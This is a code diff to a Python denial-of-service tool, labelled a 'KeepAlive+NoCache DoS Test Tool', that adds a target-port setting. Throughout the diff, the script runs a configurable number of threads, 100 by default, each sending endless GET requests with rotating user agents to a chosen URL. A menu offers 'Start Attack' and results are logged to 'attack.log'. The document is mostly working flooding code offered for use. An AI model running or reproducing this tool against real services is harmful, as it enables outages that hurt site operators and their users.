@@ -43,16 +43,17 @@ file_handler = logging.FileHandler("attack.log")
 file_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
 logging.getLogger().addHandler(file_handler)
 
-def send_request(target_url):
+def send_request(target_url, port):
     headers = {
         "Connection": "keep-alive",
         "Cache-Control": "no-cache",
         "User-Agent": random.choice(user_agents)
     }
+    full_url = f"{target_url}:{port}"
     while True:
         try:
-            response = requests.get(target_url, headers=headers)
-            logging.info(f"Sent request to {target_url}, Status Code: {response.status_code}")
+            response = requests.get(full_url, headers=headers)
+            logging.info(f"Sent request to {full_url}, Status Code: {response.status_code}")
         except requests.exceptions.RequestException as e:
             logging.error(f"Request failed: {e}")
 
@@ -64,11 +65,11 @@ def loading_animation():
         sys.stdout.flush()
         time.sleep(0.1)
 
-def start_attack(target_url, threads):
+def start_attack(target_url, port, threads):
     loading_thread = threading.Thread(target=loading_animation)
     loading_thread.start()
     with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = [executor.submit(send_request, target_url) for _ in range(threads)]
+        futures = [executor.submit(send_request, target_url, port) for _ in range(threads)]
         for future in futures:
             try:
                 future.result()
@@ -77,21 +78,23 @@ def start_attack(target_url, threads):
 
 def main_menu():
     target_url = None
+    port = 80
     threads = 100
 
     while True:
         print("\nKeepAlive+NoCache DoS Test Tool")
         print("1. Start Attack")
         print("2. Set Target URL")
-        print("3. Set Number of Threads")
-        print("4. Exit")
+        print("3. Set Port")
+        print("4. Set Number of Threads")
+        print("5. Exit")
         choice = input("Enter your choice: ")
         if choice == '1':
             if not target_url:
                 print("Target URL is not set. Please set the target URL first.")
             else:
-                print(f"Starting attack on {target_url} with {threads} threads...")
-                start_attack(target_url, threads)
+                print(f"Starting attack on {target_url}:{port} with {threads} threads...")
+                start_attack(target_url, port, threads)
         elif choice == '2':
             new_url = input("Enter the target URL: ")
             if is_valid_host(new_url):
@@ -101,6 +104,16 @@ def main_menu():
                 print("Invalid URL. Please enter a valid URL.")
         elif choice == '3':
             try:
+                new_port = int(input("Enter the port number: "))
+                if 1 <= new_port <= 65535:
+                    port = new_port
+                    print(f"Port set to {port}")
+                else:
+                    print("Port number must be between 1 and 65535.")
+            except ValueError:
+                print("Invalid input. Please enter a valid port number.")
+        elif choice == '4':
+            try:
                 new_threads = int(input("Enter the number of threads: "))
                 if new_threads > 0:
                     threads = new_threads
@@ -109,7 +122,7 @@ def main_menu():
                     print("Number of threads must be greater than 0.")
             except ValueError:
                 print("Invalid input. Please enter a valid number.")
-        elif choice == '4':
+        elif choice == '5':
             print("Exiting...")
             sys.exit(0)
         else:
